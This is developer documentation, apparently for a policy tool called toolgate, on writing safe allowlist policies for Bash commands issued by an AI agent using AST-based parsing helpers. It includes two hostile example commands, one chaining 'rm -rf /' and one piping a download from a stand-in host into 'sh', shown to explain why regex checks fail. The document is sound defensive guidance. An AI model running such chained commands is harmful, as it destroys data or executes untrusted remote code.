# Writing Bash policies

When a policy needs to inspect a Bash command, **don't parse the raw command string with regex.** A single `command` string can hide chaining (`git status && rm -rf /`), command substitution (`$(...)`, backticks), background execution (`&`), and redirects that write files. A regex that matches `git status` at the start of the string will happily approve `git status; curl evil.sh | sh`.

Instead, use the AST-based helpers in [`policies/parse-bash-ast.ts`](../policies/parse-bash-ast.ts). They run the command through `shfmt --tojson` and reject unsafe patterns — substitution, chaining, backgrounding, unsafe redirects — at the AST level before you ever see the tokens.

```ts
import type { Policy } from "@brycehanscomb/toolgate";
import { safeBashCommand } from "@brycehanscomb/toolgate/policies/parse-bash-ast";

const allowMake: Policy = {
  name: "Allow make",
  description: "Permits simple make commands",
  action: "allow",
  handler: async (call) => {
    const tokens = await safeBashCommand(call);
    if (!tokens) return; // not a single safe command → pass through
    if (tokens[0] === "make") return true;
  },
};

export default allowMake;
```

## The helpers

### `safeBashCommand(call)`

Parses a Bash tool call into a flat `string[]` of tokens. Returns `null` if the command contains pipes, shell operators (`&&`, `||`, `;`, `&`), command substitution, unsafe redirects, or multiple statements. Use this for simple, single-command policies.

### `safeBashCommandOrPipeline(call)`

Like `safeBashCommand`, but allows pipes to **safe filters**. Returns the tokens of the **first** command only (filter safety is validated automatically), or `null` for non-pipe operators or unsafe patterns. Use this to allow commands like `git log | head`.

```ts
const tokens = await safeBashCommandOrPipeline(call);
if (!tokens) return;
if (tokens[0] === "git") return true;
```

### `getAndChainSegments(file)`

Decomposes `&&`-chained commands into individual `Stmt` nodes. Returns `null` if the command contains `||`, `;`, or other unsafe operators. Use this when you need to validate each segment of a compound command independently (as the built-in `Allow pure command chains` policy does).

### `isSafeFilter(tokens)`

Returns `true` if a token array is a safe pipe filter — a command that only reads stdin and writes stdout. Safe filters include `grep`, `egrep`, `fgrep`, `head`, `tail`, `wc`, `cat`, `tr`, `cut`, `sort` (without `-o`), and `uniq`.

### `parseShell(command)`

The low-level primitive: returns the full `shfmt` AST for custom analysis when the higher-level helpers don't fit. The module also exports narrower utilities — `getArgs`, `getPipelineCommands`, `getAllLeafCommands`, `findWriteRedirects`, `findTeeTargets`, `isPureCommand`, `findGitSubcommands`, and more — see [`policies/parse-bash-ast.ts`](../policies/parse-bash-ast.ts).

### `findGitRoot(cwd)`

Returns the git repository root for a directory, or `null` if it isn't in a repo. Exported from `@brycehanscomb/toolgate/utils`.

## A worked example

See [`policies/allow-git-add.ts`](../policies/allow-git-add.ts) for a small, fully hardened policy, and the other `allow-git-*` policies for variations that pipe through safe filters.
